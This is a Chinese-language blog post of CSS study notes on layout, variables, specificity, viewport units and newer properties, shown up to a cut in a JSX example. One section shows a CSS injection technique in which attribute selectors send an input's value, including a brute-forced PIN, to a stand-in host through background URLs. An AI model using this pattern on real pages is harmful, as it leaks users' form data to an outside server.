---
title: CSS
date: 2022-06-17 18:23:10
tags: CSS
categories: htmlcss
---
### 颜色

```js
4种表示法

1、英文单词
	color:red;

2、十六进制
	color:#RRGGBB; 
    //RR 红  GG 绿  BB 蓝  
    //值得范围 00-ff
    //简写 #RGB
3、rgb 颜色
	color:rgb(0,0,0);
	//红绿蓝
	//值得范围 0-255、0%-100%
	//rgba(0,0,0)  a 代表透明度  （0-1、0%-100%）
4、HSL
	HSL分别表示：
    -色相 色轮上的程度 0-360   （0，360表示红，120绿，240蓝）
    -饱和度 0%-100%  (0%灰色，100%全彩)
    -亮度	0%-100% （0%黑色，100%白色）
    注意：IE9,Firefox,Chrome,Safari,和Opera10+.支持HSL颜色值。其他三种基本都支持
```

<!--more-->

### 移动端适配方案

```js
//确定适配方案，常用适配方案：rem适配、viewport适配、百分比适配

rem适配（配合less或者sass可以做到所量即写）

(function(){
    let w = document.documentElement.clientWidth / 16;
    let styleNode = document.createElement('style');
    styleNode.innerHTML = "html{font-size:"+w+"px !important;}";
    document.head.appendChild(styleNode);
})();

viewport适配

(function(){
    // 获取理想视口的宽度
    let clientWidth = document.documentElement.clientWidth;
    // 设计稿的宽度为750px
    let targetW = 750;
    let scale = clientWidth / targetW;
    let metaDom = document.querySelector("meta[name='viewport']");
    // 设置initial-scale
    metaDom.content = "initial-scale="+ scale + ",minimum-scale="+ scale + ",maximum-scale=" + scale
})();

```

[CSS 纵横比（aspect ratio）](https://css-irl.info/aspect-ratio-is-great/)

```css
CSS 纵横比（aspect ratio）
// 监听 视口（当前页面，iframe视口） 宽高比变化，调整样式

/* 最小宽高比 */
@media (min-aspect-ratio: 8/5) {
  div {
    background: #9af; /* blue */
  }
}

/* 最大宽高比 */
@media (max-aspect-ratio: 3/2) {
  div {
    background: #9ff;  /* cyan */
  }
}

/* 明确的宽高比, 放在最下部防止同时满足条件时的覆盖*/
@media (aspect-ratio: 1/1) {
  div {
    background: #f9a; /* red */
  }
}


<div id='inner'>
  Watch this element as you resize your viewport's width and height.
</div>
```

### js 监听 媒体查询 MediaQueryList

一个`MediaQueryList`对象在一个[`document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)上维持着一系列的[媒体查询 (en-US)](https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries)，并负责处理当媒体查询在其 document 上发生变化时向监听器进行通知的发送。

### 网格布局

```html
<!--
1、box 是容器
    -display: grid /inline-grid 指定网格布局
    -grid-template-columns 列宽 px,% 都可以
    -grid-template-rows 行高 px,%,fr 都可以
    -grid-row-gap   行间距
    -grid-column-gap 列间距
    -grid-gap 简写； eg: grid-gap: 行间距，列间距
    -grid-template-areas 区域：将一个或多个单元格划分为一个区域
        // 9个单元格，分为3个区域
        grid-template-areas: 'a a a'
                             'b b b'
                             'c c c';
        -区域的命名会影响到网格线。每个区域的起始网格线，会自动命名为区域名-start，终止网格线自动命名为区域名-end。
    -grid-auto-flow: row, column，row dense,column dense
    -justify-items 属性，项目内容水平start | end | center | stretch
    -align-items 属性，项目内容垂直 start | end | center | stretch
    -place-items 属性， 简写 place-items: 水平 垂直;
    -justify-content 属性，整个内容区域在容器里面的水平位置 start | end | center | stretch | space-around | space-between | space-evenly;
    -align-content 属性，整个内容区域在容器里面的垂直位置 start | end | center | stretch | space-around | space-between | space-evenly;
    -place-content 属性 简写 place-content: <align-content> <justify-content>;
    -grid-auto-columns 属性，多余网格的列宽【当网格只有3X3但指定4行2列位置时时会生成多余的网格】
    -grid-auto-rows 属性，多余网格的行高
    -辅助函数
        -repeat(重复数, 值) 设置行高，列宽使用 eg: repeat(3, 100px 150px 200px) 定义了9个项目列宽行高
        -minmax()   产生一个长度范围，表示长度就在这个范围之中。它接受两个参数，分别为最小值和最大值。
    -关键字
        -auto-fill 在repeat中使用，示自动填充。项目充满容器
        -fr ，1fr 代表1倍列宽，2fr代表2倍列宽
        -auto 由浏览器自己决定长度

2、box>div 是项目，span不是
-（项目）的float、display: inline-block、display: table-cell、vertical-align和column-*等设置都将失效
    ▣项目位置
        -grid-column-start属性：左边框所在的垂直网格线
        -grid-column-end属性：右边框所在的垂直网格线
        -grid-row-start属性：上边框所在的水平网格线
        -grid-row-end属性：下边框所在的水平网格线
        -grid-column 属性，简写：grid-column: <start-line> / <end-line>;
        -grid-row 属性， 简写：grid-row: <start-line> / <end-line>;
        -grid-area 属性，指定项目放在哪一个区域。
            .grid-area: a;// 指定项目放在a区域
            .简写：grid-area: <row-start> / <column-start> / <row-end> / <column-end>; // grid-area: 1 / 1 / 3 / 3;
        -justify-self 属性，置单元格内容的水平位置
        -align-self 属性，设置单元格内容的垂直位置
        -place-self 属性。place-self: <align-self> <justify-self>;
    -关键字
        -span 跨越了多少个网格

3、容器里面的水平区域称为"行"（row）垂直区域称为"列"（column）。

4、行和列的交叉区域，称为"单元格"（cell）
    -正常情况下，n行和m列会产生n x m个单元格。比如，3行3列会产生9个单元格。

5、网格线"（grid line）
    -正常情况下，n行有n + 1根水平网格线，m列有m + 1根垂直网格线，比如三行就有四根水平网格线
    -指定网格线的名字 
        grid-template-columns: [c1] 100px [c2] 100px [c3] auto [c4]
        grid-template-rows: [r1 s1] 100px [r2] 100px [r3] auto [r4] // 可设置多个名字
-->
    <div class="box">
        <div><span>1</span></div>
        <div>2</div>
        <div>3</div>
        <div>4</div>
        <div>5</div>
    </div>
```

内容超出三行显示省略

```css
 .overflow3 {
    display: -webkit-box;
    overflow: hidden;
    text-overflow: ellipsis;
    word-break: break-all;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 3;
    white-space: normal;
}
```

### css 攻击

```html
1、style-src 中的“unsafe-inline” 通过css窃取页面数据
<html>
  <style>
    input[value="a"] { background: url(https://example.com/?value=a); }
  </style>
<input type=text value=a>
    
    
<html>
  <style>
    input[value="0000"] { background: url(https://example.com/?value=0000); }
    input[value="0001"] { background: url(https://example.com/?value=0001); }
    ...
    input[value="9998"] { background: url(https://example.com/?value=9998); }
    input[value="9999"] { background: url(https://example.com/?value=9999); }
  </style>
<input name=pin type=number value=1337>
```

### 运用 transform 导致文本模糊的现象

```js
问题： 一块区域内的文本或者边框，在展示的时候，变得特别的模糊

1、当文本元素的某个祖先容器存在 transform: translate() 或者 transform: scale() 等 transform 操作时，容易出现这种问题
	必要不充分条件
2、元素作用了 transform: translate() 或者 transform: scale() 后的计算值产生了非整数
	必要不充分条件，不是所有小数值情况都会导致
    
3、文本内容是否模糊还与屏幕有关，高清屏（dpr > 2）下不容易触发，更多发生在普通屏幕下（dpr = 1）

	dpr = 物理像素 / 设备独立像素，表示设备像素比。这个与我们通常说的视网膜屏（多倍屏，Retina屏）有关。设备像素比描述的是未缩放状态下，物理像素和设备独立像素的初始比例关系。

4、并非所有浏览器都是这个表现，基本发生在 chromium 内核。
为何发生这种现象呢？
那么，为何会发生这种现象？针对这个问题，没有找到特别官方的回答，普遍的认为是因为：

由于浏览器将图层拆分到 GPU 以进行 3D 转换，而非整数的像素偏移，使得 Chrome 在字体渲染的时候，不是那么的精确。

社区里给出的一种方案：

-▪给元素设置 -webkit-font-smoothing: antialiased
font-smooth CSS 属性用来控制字体渲染时的平滑效果，该特性是非标准的，我们应该尽量不要在生产环境中使用它。并且在我的实测中，这个方法不太奏效。

-▪保证运用了 transform: translate() 或者 transform: scale() 的元素的高宽为偶数

	如果你赋予给元素的 transform 的值非常明确，譬如我上文例子中的利用其来对元素进行水平垂直居中 -- transform: translate(-50%, -50%)，让元素的高宽为偶数这个方法是可行的，但如果当你无法确定transform 的值，譬如 transform: translateX(-31.24%) 或者是 transform: scale(1.05)，那这个方法依旧无法奏效。

-▪弃用 transform
```

### css variable （css变量）

> css 变量减少样式重复定义，比如同一个颜色值要在多个地方重复使用，以前通过 less 和 sass 预处理做到，现在 css 变量也可以做到，方便维护，提高可读性

```css
:root{
  --bgcolor: blue;
  --color: red;
}
p {
  color: var(--color);
}
div {
  backgroung-color: var(--bgcolor);
  color: var(--color)
}
```

### var() 函数

```css
// --color 是变量，default 是 默认值，当--color 值无效是使用 
var(--color, default)

```



#### 在媒体查询中使用，精简代码，减少冗余

```css
.box {
  --base-size: 10;
  width: calc(var(--base-size)* 10px);
  height: clac(var(--base-size)* 5px);
  padding:calc(var(--base-size) * 1px);
}
@media screen and (min-width: 1480px) {
  .box{
    --base-size: 8;
  }
}
```

#### 方便在 js 中使用

```js
// 设置变量
document.getElementById("box").style.setPropertyValue('--color', 'pink')
// 读取变量
doucment.getElementById('box').style.getPropertyValue('--color').trim()    //pink
// 删除变量
document.getElementById('box').style.removeProperty('--color')
```

#### js 与 css 变量交互

```vue
<template>
    <p 
        class="notice-item" 
        ref="noticeItem" 
        :key="noticeList.id"
        :style="{ animationDuration: duration, '--width': $refs.noticeItem?.scrollWidth}"
    >
    {{ noticeList.text }}
    </p>
</template>
<style>
	@keyframes scrollText {
      0% {
        /* 播放完成循环播放 */
        transform: translateX(calc((var(--pwidth) + 100) * 1px));
      }
      100% {
        transform: translateX(-100%);
      }
    }
</style>
```

> 如果说 css变量需要带单位，则写法需要变化  margin-top: calc(var(--gap) * 1px);
>
> [参考阮一峰老师博客](https://www.ruanyifeng.com/blog/2017/05/css-variables.html)

### css specificity 权重

> `css specificity` 即 css 中关于选择器的权重，以下三种类型的选择器依次下降

1. `id` 选择器，如 `#app`
2. `class`、`attribute` 与 `pseudo-classes`（伪类） 选择器，如 `.header`、`[type="radio"]` 与 `:hover`
3. `type` 标签选择器和伪元素选择器，如 `h1`、`p` 和 `::before`

其中通配符选择器 `*`，组合选择器 `+ ~ >`，否定伪类选择器 `:not()` 对优先级无影响

另有内联样式 `<div class="foo" style="color: red;"></div>` 及 `!important`(最高) 具有更高的权重

**权重计算**

（id选择器个数， 类、伪类、属性选择器个数，标签、伪元素选择器个数）

```css
// (1, 1, 2)
#table-wrapper .title > p::first-line {}

// (1, 2, 2)
#table-wrapper div.title p:last-child {}

// 比较可得出 样式2权重大于样式1
```



### 有哪些 css 属性不能展示动画效果

display,height 

css 不能在 display:none 和 display:block 之间进行动画

也不能在 height:0 和 height:auto 之间进行动画



### position: sticky

> `position: sticky` 可理解为 `relative` 与 `fixed` 的结合体
>
> MDN 的解释：position: sticky 在正常文档流中仍然保有位置，然后会相对于它的最近的滚动祖先和最近的块级祖先根据 top, left, right, bottom 的值进行偏移。元素偏移不会影响其他任何元素的位置，因为会为该元素创建一个新的层叠上下文，从而不会影响到页面上的其他元素

### 网页实现黑暗模式

```css
// 颜色对换
html[theme="dark-model"] {
  filter: invert(1) hue-rotate(180);
  transition: color 300ms, background-color 300ms; /*过渡动画*/
}

// 自定义，通过媒体查询 改变 根元素 颜色变量
@media (prefers-color-scheme: dark) {
  :root {
  }
}
```

### 隐藏元素的几种办法

#### 01 display: none

通过 CSS 操控 display，移出文档流

```css
display: none;
```

#### 02 opacity: 0

透明度为 0，仍在文档流中，当作用于其上的事件(如点击)仍有效

```css
opacity: 0;
```

#### 03 visibility: hidden

透明度为 0，仍在文档流中，**但作用于其上的事件(如点击)无效**，这也是 `visibility:hidden` 与 `opacity: 0` 的区别

```css
visibility: hidden;
```

#### 04 content-visibility

移出文档流，但是再次显示时消耗性能低

```css
content-visibility: hidden;
```

#### 05 绝对定位于当前页面的不可见位置

```css
position: absolute;
top: -9000px;
left: -9000px;
```

#### 06 字体大小设置为 0

```css
font-size: 0;
```



### 大屏三等分，中屏二等分，小屏1等分

```html
<style>
	@media (min-width: 768px) {
      .container {
        grid-template-columns: repeat(2, minmax(0,1fr));
      }
    }

    @media (min-width: 1024px) {
      .container {
        grid-template-columns: repeat(3, minmax(0, 1fr));
      }
    }

    .container {
      display: grid;
      // grid-template-columns: repeat(1, 1fr);
    }

    .container {
      background-color: #eee;
      gap: 1rem;
    }

    .item {
      background-color: #aaa;
      height: 300px;
      border: 1px solid #888;
    }
</style>

<div class="container">
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
</div>
```

### 自定义滚动条的样式

> 滚动条相关样式都是伪元素，以 `scrollbar` 打头，有以下伪元素，从 `-webkit` 中可见兼容性一般，不过无所谓，现在 Chrome 浏览器占大头

- `::-webkit-scrollbar` — 整个滚动条.
- `::-webkit-scrollbar-button` — 滚动条上的按钮 (上下箭头).
- `::-webkit-scrollbar-thumb` — 滚动条上的滚动滑块.
- `::-webkit-scrollbar-track` — 滚动条轨道.
- `::-webkit-scrollbar-track-piece` — 滚动条没有滑块的轨道部分.
- `::-webkit-scrollbar-corner` — 当同时有垂直滚动条和水平滚动条时交汇的部分.
- `::-webkit-resizer` — 某些元素的 corner 部分的部分样式(例:textarea 的可拖动按钮).

```css
// 但其实最常用的是以下几个伪元素：滚动条、滑块、轨道，如下滚动条设置成功

# 滚动条
::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}

# 滑块
::-webkit-scrollbar-track {
  border-radius: 3px;
  background: rgba(0, 0, 0);
  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.08);
}

# 轨道
::-webkit-scrollbar-thumb {
  border-radius: 3px;
  background: rgba(0, 0, 1);
  box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
}
```

### 网站字体设置默认字体优先

```css
font-family: system-ui;

eg: bootstrap.css 

$font-family-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue",
  Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
  "Segoe UI Symbol", "Noto Color Emoji" !default;
```

### css 避免命名冲突

1. BME式：即less、scss 的那种嵌套写法
2. css scoped: 如 vue 样式的 scoped 属性
3. css module 



### css 实现方格背景

```css
background: linear-gradient(90deg, rgba(200, 200, 200, 0.1) 3%, transparent 0),
  linear-gradient(rgba(200, 200, 200, 0.1) 3%, transparent 0);
background-size: 20px 20px;
```

### css 实现超出省略，超出多行省略

```css
1、超出省略

overflow: hidden;
text-overflow: ellipsis;
white-space: nowrap;

2、超出多行省略

overflow: hidden;
display: -webkit-box;
-webkit-box-orient: vertical;
-webkit-line-clamp: 2;
```



### [垂直居中长度为父容器一半的子元素](https://codepen.io/shanyue/pen/GRWmaVw)

设置 子元素宽度为父元素一半，再通过 aspect-ratio: 1/1; 设置宽高比 ​1:1即可

```html
<style>
	.container {
      display: grid;
      place-items: center;
    }

    .item {
      width: 50%;
      aspect-ratio: 1/1;
    }

    // 以下是样式代码

    .item {
      background-color: skyblue;
    }

    .container {
      height: 600px;
      background-color: #ccc;
      border: 1px solid red; 
    }
</style>

<div class="container">
  <div class="item"></div>
</div>
```

### BFC 块级格式化上下文

> 块格式化上下文（Block Formatting Context，BFC）是Web页面的可视化CSS渲染的一部分，是布局过程中生成块级盒子的区域，也是浮动元素与其他元素的交互限定区域。
>
> - BFC 是一个独立的布局环境,可以理解为一个容器,在这个容器中按照一定规则进行物品摆放,并且**不会影响其它环境中的物品**。
> - **如果一个元素符合触发 BFC 的条件，则 BFC 中的元素布局不受外部影响。**
> - 浮动元素会创建 BFC，则浮动元素内部子元素主要受该浮动元素影响，所以**两个浮动元素之间是互不影响的**。

- 创建BFC
	1. 根元素或包含根元素的元素
	2. 浮动元素 float ＝ left | right 或 inherit**（≠ none）**
	3. 绝对定位元素 position ＝ absolute 或 fixed
	4. display ＝ inline-block | flex | inline-flex | table-cell 或 table-caption
	5. overflow ＝ hidden | auto 或 scroll **(≠ visible)**
- BFC特性
	1. BFC 是一个独立的容器，容器内子元素不会影响容器外的元素。反之亦如此。
	2. 盒子从顶端开始垂直地一个接一个地排列，盒子之间垂直的间距是由 margin 决定的。
	3. 在同一个 BFC 中，两个相邻的块级盒子的**垂直外边距**会发生重叠。
	4. **BFC 区域不会和 float box 发生重叠。**
	5. **BFC 能够识别并包含浮动元素，当计算其区域的高度时，浮动元素也可以参与计算了。**
- BFC 作用
	1. 包含浮动元素时（清除浮动）不会出现高度塌陷【若是通过定位脱离文档流，导致的高度塌陷则没有办法】
	2. 避免外边距折叠，不同BFC包裹元素外边距才不会折叠

> 外边距折叠：**外边距折叠的条件是 margin 必须相邻!**
>
> - 两个相邻的外边距都是 **正数** 时，折叠外边距是两者中较大的值。
> - 两个相邻的外边距都是 **负数** 时，折叠外边距是两者中绝对值较大的值。
> - 两个相邻的外边距是 **一正一负** 时，折叠外边距是两者相加的和。
>
> [原文地址传送](https://segmentfault.com/a/1190000013647777)

### rem、em、vw、vh 的值各是什么意思

- `rem`: 根据根元素(即 `html`)的 `font-size`
- `em`: 根据**自身元素**的 `font-size`
- `vw`: viewport width
- `vh`: viewport height

### normalize.css 与 reset.css 又何区别

- [normalize.css (opens new window)](https://github.com/necolas/normalize.css/blob/master/normalize.css): 会保留有用的样式，比如 h1 的字体大小
- [reset.css (opens new window)](https://github.com/jgthms/minireset.css/blob/master/minireset.css): 把所有样式都重置，比如 h1、h2、h3 的字体大小都进行了重置，保持了无样式



### CSS 的盒模型

- 标准盒模型 width = content-width height = content-height
- 怪异盒模型 width = content-width + padding + border height = content-height + padding + border

### 样式裁剪

> [示例](https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path#%E7%A4%BA%E4%BE%8B)

```css
语法：
clip-path = 
  <clip-source>                        |
  [ <basic-shape> || <geometry-box> ]  |
  none                                 

// 用其他图片来裁剪图片
<clip-source> = 
  <url>  

// 选定盒模型
<geometry-box> = 
  <shape-box>  |
  fill-box     |
  stroke-box   |
  view-box     

<shape-box> = 
  <box>       |
  margin-box  

<box> = 
  border-box   |
  padding-box  |
  content-box  

// basic-shape 裁剪形状
// 圆形裁剪
clip-path: circle(50%);

// 
clip-path: ellipse(130px 140px at 10% 20%);

// 
clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%);

// 路径裁剪
clip-path: path('M 0 200 L 0,75 A 5,5 0,0,1 150,75 L 200 200 z');
```

### [:has 属性](https://webkit.org/blog/13096/css-has-pseudo-class/#styling-form-states-without-js)

> CSS 新增的`:has()`支持很多表单状态，完全可以不使用 JS 脚本，就实现可以跟用户互动的表单。

### initial-letter

> 首字母样式下沉。它需要两个空格分隔的值
>
> - 第一个参数定义字母的大小以及它将占据多少行。该字母将在保持其纵横比的同时放大。您不能使用负值，但可以使用小数值。
> - 第二个参数定义字母接收器。这可以被认为是字母所在位置的偏移量。第二个值是可选的，不能为负数。如果它不存在，它假定字母大小的值下降到最接近的整数。这相当于使用关键字“drop”。sink 还接受另一个关键字值“raise”，相当于 sink 为 1。
>
> ```css
> .selector:first-letter {
>     initial-letter: 2  2;
> }
> ```
>
> VS以前得写法
>
> ```css
> p:first-letter {
>     color: hsl(220, 94%, 51%);
>     font-weight: bold;
>     font-size: 4rem;
>     float: left;
>     line-height: 1;
>     margin-right: 0.25rem;
> }
> ```
>
> 
>
> ```css
> // 测试支持
> @supports (initial-letter: 1 1) { /* Your supported styles */ }
> ```

### 适配移动端视口的单位

postcss-px-to-viewport，一个postcss插件自动将px单位转换为 vh,vw 单位

> 桌面端的 vh,vw 单位在移动端下 设置100%，由于状态栏，浏览器导航栏，📱下面的按钮栏，会导致 100% vh出现滚动条。
>
> 为了解决这个问题，CSS 工作组规定了视口的各种状态。
>
> - **大视口**：视口大小假设任何动态扩展和缩回的 UA 接口被缩回。
> - **小视口**：视口大小假设任何动态扩展和缩回的 UA 接口都可以扩展。

新视口也分配了单位：

- 代表大视口的单位有`lv`前缀。单位为`lvw`、`lvh`、`lvi`、`lvb`、`lvmin`和`lvmax`。
- 代表小视口的单位有`sv`前缀。单位为`svw`、`svh`、`svi`、`svb`、`svmin`和`svmax`。

除非调整视口本身的大小，否则这些视口百分比单位的大小是固定的（因此是稳定的）。

![image-20230331091459773](https://raw.githubusercontent.com/wyf195075595/images/main/blog/image-20230331091459773.png)

除了大视口和小视口之外，还有一个动态视口，它动态考虑了 UA UI：

- 当动态工具栏展开时，动态视口等于小视口的大小。
- 当动态工具栏被缩回时，动态视口等于大视口的大小。

它的伴随单位有`dv`前缀：`dvw`, `dvh`, `dvi`, `dvb`, `dvmin`, 和`dvmax`。它们的尺寸夹在它们`lv*`和`sv*`对应物之间。

![image-20230331091431176](https://raw.githubusercontent.com/wyf195075595/images/main/blog/image-20230331091431176.png)

这些单元在 Chrome 108 中发布，加入了已经支持的 Safari 和 Firefox。

浏览器支持

- chrome 108
- 火狐 101
- Edge 108
- sofari 15.4

在没有动态 UA UI 的浏览器中（例如桌面版 Chrome），大视口、小视口和动态视口的大小是相同的。

**[注意事项](https://web.dev/viewport-units/#caveats)**

关于视口单位，有几点需要注意：

- 没有一个视口单元考虑滚动条的大小。在启用了经典滚动条的系统上，元素大小`100vw`因此会有点太宽。这是按照[规格](https://www.w3.org/TR/css-values-4/#viewport-relative-lengths:~:text=In all cases%2C scrollbars are assumed not to exist.)。
- 动态视口的值不会以 60fps 更新。在所有浏览器中，随着 UA UI 展开或缩回，更新会受到限制。一些浏览器甚至完全根据使用的手势（慢速滚动与滑动）来消除更新。
- 屏幕键盘（也称为虚拟键盘）不被视为 UA UI 的一部分。因此它不会影响视口单位的大小。在 Chrome 中，[您可以选择加入虚拟键盘的存在会影响视口单位的行为](https://developer.chrome.com/blog/viewport-resize-behavior/#opting-in-to-a-different-behavior)。

> [参考地址](https://web.dev/viewport-units/)

### [用于理解css3D](https://garden.bradwoods.io/notes/css/3d)

> 一个网站，这个网页提供互动演示，帮助理解 CSS 里面与 3D 有关的各项属性。



### 去除表单自动填充的白色背景

```css
// 去除填充的白色背景
input:-webkit-autofill {
    box-shadow:0 0 0 1000px transparent inset !important;
}
input:-internal-autofill-previewed,
input:-internal-autofill-selected {
    -webkit-text-fill-color: #fff !important;
    transition: background-color 5000s ease-in-out 0s !important;
}
```

### 文本高度自适应

**form-sizing** 属性，一个带有 `form-sizing` 属性的实验性 CSS 规则即将推出，它允许您根据用户输入的文本量自动增加 textarea 的高度。



### 锚点定位布局

加上一点js就能实现可拖拽流程图效果。chrome 125版本特有的

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Home</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <link rel="stylesheet" href="index.css" />
    <script type="module" src="index.js"></script>
  </head>
  <body>
    <div class="one draggable">one</div>
    <div class="two draggable">two</div>
    <div class="line"></div>

    <div class="three draggable">three</div>
    <div class="line line-two"></div>
  </body>
</html>
```

```js
const dragElement = (element) => {
  let x = 0;
  let y = 0;
  let xOffset = 0;
  let yOffset = 0;

  element.onmousedown = (event) => {
    event.preventDefault();
    xOffset = event.clientX;
    yOffset = event.clientY;

    document.onmouseup = () => {
      document.onmouseup = null;
      document.onmousemove = null;
    };

    document.onmousemove = (event) => {
      x = xOffset - event.clientX;
      y = yOffset - event.clientY;
      xOffset = event.clientX;
      yOffset = event.clientY;
      element.style.top = `${element.offsetTop - y}px`;
      element.style.left = `${element.offsetLeft - x}px`;
    };
  };
};

document.querySelectorAll('.draggable').forEach(i => dragElement(i));
```



```css
html {
  box-sizing: border-box;
}

*, *:before, *:after {
  box-sizing: inherit;
}

body {
  height: 100dvh;
  font-family: system-ui;
  font-size: 18px;
  margin: 0;
  padding: 48px;
}

.draggable {
  position: absolute;
  padding: 1rem;
  border: 2px solid #2d2d2d;
  background: #e9e9e9;
  cursor: grab;
  width: 80px;
  height: 80px;
  display: flex;
  place-items: center;
  justify-content: center;
}

.one {
  anchor-name: --one;
}

.two {
  anchor-name: --two;
  top: 45vh;
  left: 45vw;
}

.line {
  --color: red;
  anchor-name: --line;
  position-try-options: flip-block, flip-inline, flip-block flip-inline;
  top: anchor(--one center);
  bottom: anchor(--two center);
  left: anchor(--one center);
  right: anchor(--two center);
  position: absolute;
  z-index: -1;
  background: linear-gradient(var(--color), var(--color)) no-repeat center/2px 100%;
}

.line::before,
.line::after {
  position: fixed;
  display: block;
  content: '';
  background: var(--color);
  height: 2px;
}

.line::before {
  position-try-options: inherit;
  bottom: anchor(--one center);
  left: anchor(--one right);
  right: anchor(--line center);
}

.line::after {
  position-try-options: inherit;
  bottom: anchor(--two center);
  right: anchor(--two left);
  left: anchor(--line center);
}




.three {
  anchor-name: --three;
  top: 80vh;
  right: 48px;
}

.line-two {
  --color: blue;
  anchor-name: --line-two;
  top: anchor(--two center);
  bottom: anchor(--three center);
  left: anchor(--two center);
  right: anchor(--three center);
}

.line-two::before {
  bottom: anchor(--two center);
  left: anchor(--two right);
  right: anchor(--line-two center);
}

.line-two::after {
  bottom: anchor(--three center);
  right: anchor(--three left);
  left: anchor(--line-two center);
}
```

​	

### [Magick](https://css.winterveil.net/translations/zh-CN.html?name=&school=&message=&radio=radio2)

> magick.css是一个极简的，（大部分）无类的CSS框架， 它的设计目标是易于使用和理解。它包含在一个文件中， 每一个选择都有注释。目标是实现优雅，但神奇的游戏外观， 同时最大化可读性和传达信息的能力；*有点类似于巫师的笔记*。
>
> 该框架在**所有设备**和屏幕尺寸上保持其美观和功能，并且完全**无需JavaScript**。它的灵感来源于[LaTeX](https://www.latex-project.org/)， 老式的TTRPG规则书，像[concrete.css](https://concrete.style/) 和 [Tufte CSS](https://edwardtufte.github.io/tufte-css/)这样的CSS框架，以及"设计即可用性" 的极简主义原则。
>
> magick.css 与 [normalize.css](https://necolas.github.io/normalize.css/) 配合使用效果最佳， **强烈推荐使用！**

### css 垂直居中

这个属性终于出现了

```html
<div style="align-content: center; height: 100px;">
  <code>align-content</code> just works!
</div>
```

### @layer

> @layer 是CSS级联层（Cascading Layers）的一部分，它允许开发者将样式规则分组到不同的层中。这些层在浏览器解析样式时具有特定的顺序和优先级，从而提供了一种更加灵活和强大的方式来组织和控制样式的应用。

```css
@layer <layer-name> {  
  /* 在这里编写你的CSS规则 */  
}  
  
/* 示例 */  
@layer base {  
  body {  
    margin: 0;  
    padding: 0;  
    font-family: Arial, sans-serif;  
  }  
}  
  
@layer theme {  
  body {  
    background-color: #f0f0f0;  
  }  
}  
  
@layer components {  
  button {  
    padding: 10px 20px;  
    border: none;  
    border-radius: 5px;  
    background-color: blue;  
    color: white;  
  }  
}

```

### [如何使用 CSS flexbox 制作时间线](https://www.jonashietala.se/blog/2024/08/25/a_simple_timeline_using_css_flexbox/)（英文）



### 纵横比

对于高清视频，您可以仅使用

```css
aspect-ratio: 16/9;
```

 。对于完美正方形，仅需要

```css
aspect-ratio: 1
```

 ，因为隐含的第二个值也是`1` 。

### object-fit

无论哪种情况， `object-fit`都是与`aspect-ratio`完美搭配的属性，可确保应用自定义纵横比时图像不会扭曲。

```css
.image {
  object-fit: cover;
  aspect-ratio: 1;

  /* Optional: constrain image size */
  max-block-size: 250px;
}
```

### 边距内联

`margin-inline`用作设置内联（水平书写模式下的左侧和右侧）边距的简写。

这里的替换很简单：

```css
/* Before */
margin-left: auto;
margin-right: auto;

/* After */
margin-inline: auto;
```

### 文本下划线偏移

使用`text-underline-offset`可以控制文本基线和下划线之间(上下)的距离。该属性已成为我的标准重置的一部分，应用如下：

```css
a:not([class]) {
	text-underline-offset: 0.25em;
}
```

- [text-decoration-color](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration-color)更改下划线颜色
- [text-decoration-thickness](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration-thickness)更改下划线笔划粗细。



### 轮廓偏移

效果是 outline 可以外扩和内缩，类似于 box-shadow 的效果

```css
.outline-offset {
  outline: 2px dashed blue;
  outline-offset: var(--outline-offset, .5em);
}
```

### 滚动边距顶部/底部

设置滚动条偏移量

可以缓解激活锚链接时粘性导航元素覆盖内容所引起的问题。使用`scroll-margin-top`我们可以在通过**导航滚动到元素时增加元素上方的空间**，以考虑粘性导航占用的空间。

```css
[id] {
	scroll-margin-top: 2rem;
}
```

### 主题配色方案

如果您要启用调整整个应用程序，请在`:root`上设置以下内容，即优先选择`dark`主题（或翻转顺序以优先选择`light`主题）。

```css
:root {
	color-scheme: dark light;
}
```

您还可以在单个元素上定义`color-scheme` ，例如调整具有深色背景的元素内的表单控件以提高对比度。

```css
.dark-background {
	color-scheme: dark;
}
```

### 表单配色方案

改变元素选中，高亮时的颜色,如复选框或单选按钮的颜色

```css
:root {
  accent-color: mediumvioletred;
}
```



### 过度滚动

嵌套元素滚动，滚动到底时不会触发 外部页面滚动。除非鼠标移出范围

```css
.sidebar, .article {
  overscroll-behavior: contain;
}
```

### 文本换行

`balance` ，其目标是平衡每行文本的字符数。让每行字数量差球不多，不满足就不换行

```css
:is(h1, h2, h3, h4, .text-balance) {
  text-wrap: balance;

  /* For demonstration */
  max-inline-size: 25ch;
}
```

pretty， 让最后一行最少有两个及以上字符，不满足就不换行

```css
p {
  text-wrap: pretty;

  /* For demonstration */
  max-inline-size: 35ch;
}
```



### 滚动条优化

​	在某些情况下，滚动条的出现或消失可能会导致不必要的布局变化。例如，当显示对话框覆盖并且背景页面添加`overflow: hidden`以防止滚动时，导致移动不再需要的滚动条

`scrollbar-gutter`可以在布局中为滚动条保留空间，从而防止出现不需要的移动。当不需要滚动条时，浏览器仍然会绘制一个装订线，作为除了滚动容器上的任何填充之外创建的额外空间。



### [3d折叠效果](https://www.joshwcomeau.com/react/folding-the-dom/)

本文介绍如何使用 CSS 实现 3D 的页面折叠动画效果(英文)

```jsx
const Foldable = ({ width, height, src }) => {
  const [
    foldAngle,
    setFoldAngle,
  ] = React.useState(0);

  // Both our top half and bottom half share
  // a few common styles
  const sharedStyles = {
    width,
    height: height / 2,
  };

  return (
    <div style={{ perspective: 500 }}>
      {/* Top half */}
      <div
        style={{
          ...sharedStyles,
          // This property's new ⤸
          overflow: 'hidden',
        }}
      >
